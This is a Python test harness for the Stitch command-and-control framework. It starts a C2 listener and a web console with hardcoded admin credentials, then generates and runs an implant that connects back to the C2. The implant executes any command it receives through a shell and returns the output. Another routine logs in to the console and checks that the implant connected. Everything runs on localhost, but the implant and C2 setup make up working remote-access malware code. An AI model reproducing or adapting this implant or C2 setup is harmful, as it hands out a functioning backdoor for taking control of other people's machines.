#!/usr/bin/env python3
"""
Phase 2: Build Complete Testing Infrastructure
Live environment testing with full monitoring
"""

import os
import sys
import time
import json
import threading
import subprocess
import socket
import requests
import logging
from datetime import datetime
from pathlib import Path

sys.path.insert(0, '/workspace')

class TestingInfrastructure:
    def __init__(self):
        self.test_dir = Path('/workspace/test_infrastructure')
        self.test_dir.mkdir(exist_ok=True)
        self.processes = {}
        self.monitors = {}
        self.test_results = []
        
        # Setup logging
        self.setup_logging()
        
    def setup_logging(self):
        """Configure comprehensive logging"""
        log_file = self.test_dir / f'test_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        
        logging.basicConfig(
            level=logging.DEBUG,
            format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger('TestInfra')
        self.logger.info("Testing infrastructure initialized")
        
    def create_process_monitor(self, name, process):
        """Monitor a process output in real-time"""
        def monitor():
            self.logger.info(f"Monitoring {name} (PID: {process.pid})")
            
            for line in process.stdout:
                line = line.strip()
                if line:
                    self.logger.debug(f"[{name}] {line}")
                    
                    # Check for errors
                    if 'error' in line.lower() or 'failed' in line.lower():
                        self.logger.error(f"[{name}] ERROR: {line}")
        
        monitor_thread = threading.Thread(target=monitor, daemon=True)
        monitor_thread.start()
        self.monitors[name] = monitor_thread
        
    def start_c2_server(self):
        """Start C2 server with full monitoring"""
        self.logger.info("Starting C2 server...")
        
        server_script = self.test_dir / 'c2_server.py'
        
        code = '''
import sys
import os
sys.path.insert(0, '/workspace')
os.environ['STITCH_ADMIN_USER'] = 'testadmin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'testpassword123'

from Application.stitch_cmd import stitch_server
import time

print("[C2] Starting Stitch server...")
server = stitch_server()
server.do_listen('4040')
print("[C2] Server listening on port 4040")

# Monitor loop
while True:
    time.sleep(5)
    if server.inf_sock:
        for ip, sock in server.inf_sock.items():
            print(f"[C2] Active connection: {ip}")
    else:
        print("[C2] No active connections")
'''
        
        with open(server_script, 'w') as f:
            f.write(code)
        
        proc = subprocess.Popen(
            ['python3', str(server_script)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        self.processes['c2_server'] = proc
        self.create_process_monitor('c2_server', proc)
        
        # Wait for server to start
        time.sleep(3)
        
        # Verify it's listening
        sock = socket.socket()
        result = sock.connect_ex(('127.0.0.1', 4040))
        sock.close()
        
        if result == 0:
            self.logger.info("C2 server started successfully")
            return True
        else:
            self.logger.error("C2 server failed to start")
            return False
    
    def start_web_interface(self):
        """Start web interface with monitoring"""
        self.logger.info("Starting web interface...")
        
        web_script = self.test_dir / 'web_server.py'
        
        code = '''
import sys
import os
sys.path.insert(0, '/workspace')
os.environ['STITCH_ADMIN_USER'] = 'testadmin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'testpassword123'

print("[Web] Starting web interface...")

from web_app_real import app, socketio, start_stitch_server
import threading

# Start background server
server_thread = threading.Thread(target=start_stitch_server, daemon=True)
server_thread.start()

print("[Web] Web interface starting on port 5000...")

# Run web interface
socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
'''
        
        with open(web_script, 'w') as f:
            f.write(code)
        
        proc = subprocess.Popen(
            ['python3', str(web_script)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        self.processes['web_interface'] = proc
        self.create_process_monitor('web_interface', proc)
        
        # Wait for web to start
        for i in range(10):
            time.sleep(2)
            try:
                resp = requests.get('http://localhost:5000/health')
                if resp.status_code == 200:
                    self.logger.info("Web interface started successfully")
                    return True
            except:
                continue
        
        self.logger.error("Web interface failed to start")
        return False
    
    def create_test_payload(self, name='test_payload'):
        """Create a test payload with full instrumentation"""
        self.logger.info(f"Creating test payload: {name}")
        
        payload_path = self.test_dir / f'{name}.py'
        
        code = '''#!/usr/bin/env python3
import socket
import time
import sys
import subprocess
import json

class InstrumentedPayload:
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 4040
        self.connected = False
        
    def connect(self):
        print(f"[Payload] Connecting to {self.host}:{self.port}")
        
        while not self.connected:
            try:
                self.sock = socket.socket()
                self.sock.connect((self.host, self.port))
                self.connected = True
                print("[Payload] Connected successfully")
                
                # Send identification
                self.sock.send(b'INSTRUMENTED_PAYLOAD\\n')
                
            except Exception as e:
                print(f"[Payload] Connection failed: {e}")
                time.sleep(2)
    
    def command_loop(self):
        while self.connected:
            try:
                # Receive command
                data = self.sock.recv(1024)
                if not data:
                    break
                    
                cmd = data.decode().strip()
                print(f"[Payload] Received command: {cmd}")
                
                # Execute command
                if cmd == 'exit':
                    break
                elif cmd == 'test':
                    output = "Test successful"
                elif cmd == 'info':
                    output = json.dumps({
                        'type': 'instrumented',
                        'version': '1.0',
                        'pid': os.getpid()
                    })
                else:
                    try:
                        result = subprocess.check_output(cmd, shell=True, timeout=5)
                        output = result.decode()
                    except Exception as e:
                        output = f"Error: {e}"
                
                # Send response
                self.sock.send((output + '\\n').encode())
                print(f"[Payload] Sent response: {len(output)} bytes")
                
            except Exception as e:
                print(f"[Payload] Error: {e}")
                self.connected = False
    
    def run(self):
        self.connect()
        self.command_loop()
        print("[Payload] Exiting")

if __name__ == "__main__":
    import os
    payload = InstrumentedPayload()
    payload.run()
'''
        
        with open(payload_path, 'w') as f:
            f.write(code)
        
        os.chmod(payload_path, 0o755)
        self.logger.info(f"Test payload created: {payload_path}")
        
        return payload_path
    
    def execute_test_payload(self, payload_path):
        """Execute a test payload with monitoring"""
        self.logger.info(f"Executing payload: {payload_path}")
        
        proc = subprocess.Popen(
            ['python3', str(payload_path)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        name = f"payload_{proc.pid}"
        self.processes[name] = proc
        self.create_process_monitor(name, proc)
        
        return proc
    
    def test_web_api(self):
        """Test web API with comprehensive checks"""
        self.logger.info("Testing web API...")
        
        session = requests.Session()
        results = {}
        
        # Test login
        try:
            # Get CSRF
            resp = session.get('http://localhost:5000/login')
            import re
            csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', resp.text)
            
            if csrf_match:
                csrf_token = csrf_match.group(1)
                
                # Login
                login_data = {
                    'username': 'testadmin',
                    'password': 'testpassword123',
                    'csrf_token': csrf_token
                }
                
                resp = session.post('http://localhost:5000/login', data=login_data, allow_redirects=False)
                
                if resp.status_code in [302, 303]:
                    self.logger.info("Login successful")
                    results['login'] = True
                    
                    # Get updated CSRF
                    resp = session.get('http://localhost:5000/')
                    csrf_match = re.search(r'name="csrf-token".*?content="([^"]+)"', resp.text)
                    if csrf_match:
                        csrf_token = csrf_match.group(1)
                    
                    # Test connections API
                    headers = {'X-CSRFToken': csrf_token}
                    resp = session.get('http://localhost:5000/api/connections', headers=headers)
                    
                    if resp.status_code == 200:
                        connections = resp.json()
                        self.logger.info(f"Connections API: {len(connections)} connections")
                        results['connections'] = len(connections)
                    
                else:
                    self.logger.error(f"Login failed: {resp.status_code}")
                    results['login'] = False
                    
        except Exception as e:
            self.logger.error(f"API test error: {e}")
            results['error'] = str(e)
        
        return results
    
    def run_comprehensive_test(self):
        """Run a complete system test"""
        self.logger.info("="*70)
        self.logger.info("COMPREHENSIVE SYSTEM TEST")
        self.logger.info("="*70)
        
        test_results = {}
        
        # Start C2 server
        test_results['c2_server'] = self.start_c2_server()
        
        # Start web interface
        test_results['web_interface'] = self.start_web_interface()
        
        # Create and execute test payload
        payload_path = self.create_test_payload()
        payload_proc = self.execute_test_payload(payload_path)
        test_results['payload_started'] = payload_proc.poll() is None
        
        # Wait for connections
        time.sleep(5)
        
        # Test web API
        api_results = self.test_web_api()
        test_results['api'] = api_results
        
        # Check if payload connected
        if 'connections' in api_results:
            test_results['payload_connected'] = api_results['connections'] > 0
        
        return test_results
    
    def cleanup(self):
        """Clean up all processes"""
        self.logger.info("Cleaning up...")
        
        for name, proc in self.processes.items():
            if proc.poll() is None:
                self.logger.info(f"Terminating {name}")
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except:
                    proc.kill()
    
    def generate_report(self, results):
        """Generate test report"""
        self.logger.info("\n" + "="*70)
        self.logger.info("TEST RESULTS")
        self.logger.info("="*70)
        
        for key, value in results.items():
            status = "✓" if value else "✗"
            self.logger.info(f"{status} {key}: {value}")
        
        # Save results
        results_file = self.test_dir / 'test_results.json'
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        self.logger.info(f"\nResults saved to: {results_file}")

def main():
    infra = TestingInfrastructure()
    
    try:
        # Run comprehensive test
        results = infra.run_comprehensive_test()
        
        # Generate report
        infra.generate_report(results)
        
    finally:
        # Always cleanup
        infra.cleanup()

if __name__ == "__main__":
    main()